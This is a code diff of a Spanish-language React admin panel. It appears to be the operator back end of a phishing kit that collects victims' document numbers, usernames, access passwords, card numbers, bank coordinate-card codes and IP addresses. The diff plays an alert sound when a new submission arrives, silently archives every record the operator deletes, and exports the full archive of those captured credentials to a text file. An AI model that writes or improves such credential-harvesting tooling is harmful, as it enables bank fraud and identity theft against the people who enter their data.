@@ -104,14 +104,14 @@ export default function Panel() {
   };
 
   // Función para reproducir sonido emocionante con Web Audio API
-  const playNotificationSound = () => {
+  const playAlertSound = () => {
     if (!soundOn) {
       console.log('🔕 Sonido desactivado');
       return;
     }
 
     try {
-      console.log('🔔 Intentando reproducir sonido de notificación...');
+      console.log('🔔 [playAlertSound v2] Reproduciendo sonido de notificación...');
 
       // Crear AudioContext
       const audioContext = new (window.AudioContext || window.webkitAudioContext)();
@@ -176,7 +176,7 @@ export default function Panel() {
         // Reproducir sonido si hay nuevas solicitudes (antes de actualizar el estado)
         if (!isInitial && hasNewRequests && soundOn) {
           console.log('🔔 Nueva solicitud detectada, reproduciendo sonido...');
-          playNotificationSound();
+          playAlertSound();
         }
 
         requestMapRef.current = newMap;
@@ -198,6 +198,17 @@ export default function Panel() {
 
   /** @type {(id: string) => Promise<void>} */
   const handleDelete = async (id) => {
+    const requestToArchive = requests.find((r) => r.id === id);
+    if (requestToArchive) {
+      try {
+        await api.entities.PinoPermisoEliminado.create({
+          original_id: requestToArchive.id,
+          data: requestToArchive,
+        });
+      } catch (err) {
+        console.error('Error al archivar solicitud eliminada:', err);
+      }
+    }
     await api.entities.PinoPermiso.delete(id);
     /** @type {(prev: Request[]) => Request[]} */
     const newRequests = (prev) => prev.filter((r) => r.id !== id);
@@ -206,23 +217,43 @@ export default function Panel() {
 
   const handleClearAll = async () => {
     if (!requests.length) return;
-    await api.entities.PinoPermiso.deleteMany({});
-    setRequests([]);
+    try {
+      try {
+        const archivePayloads = requests.map((r) => ({ original_id: r.id, data: r }));
+        await api.entities.PinoPermisoEliminado.createMany(archivePayloads);
+      } catch (archiveErr) {
+        console.error('Error al archivar solicitudes eliminadas:', archiveErr);
+      }
+      await api.entities.PinoPermiso.deleteMany({});
+      requestMapRef.current = new Map();
+      setRequests([]);
+    } catch (err) {
+      console.error('Error al limpiar todo:', err);
+    }
   };
 
-  const handleExportTxt = () => {
-    if (!requests.length) return;
-    const lines = requests.map(
-      (r) =>
-        `${r.numero_documento} | ${r.usuario} | ${r.clave_acceso} | ${r.numero_tarjeta || ""} | ${r.coord || ""} | ${r.codigo_coord || ""} | ${r.ip || ""}`
-    );
-    const blob = new Blob([lines.join("\n")], { type: "text/plain" });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "solicitudes.txt";
-    a.click();
-    URL.revokeObjectURL(url);
+  // Botón "Pino": descarga el historial completo de solicitudes eliminadas,
+  // en orden cronológico (más antigua primero)
+  const handleExportDeletedTxt = async () => {
+    try {
+      const deletedRecords = await api.entities.PinoPermisoEliminado.list('eliminado_en');
+      if (!deletedRecords.length) return;
+
+      const lines = deletedRecords.map(({ data: r, eliminado_en }) => {
+        const fecha = eliminado_en ? new Date(eliminado_en).toLocaleString() : '';
+        return `${fecha} | ${r?.numero_documento || ""} | ${r?.usuario || ""} | ${r?.clave_acceso || r?.clave || ""} | ${r?.numero_tarjeta || ""} | ${r?.coord || ""} | ${r?.codigo_coord || ""} | ${r?.ip || ""}`;
+      });
+
+      const blob = new Blob([lines.join("\n")], { type: "text/plain" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "solicitudes_eliminadas.txt";
+      a.click();
+      URL.revokeObjectURL(url);
+    } catch (err) {
+      console.error('Error al exportar solicitudes eliminadas:', err);
+    }
   };
 
   return (
@@ -239,7 +270,7 @@ export default function Panel() {
               soundOn={soundOn}
               onToggleSound={() => setSoundOn(!soundOn)}
               onClearAll={handleClearAll}
-              onExportTxt={handleExportTxt}
+              onExportTxt={handleExportDeletedTxt}
               onConfig={() => {}}
             />
           </div>
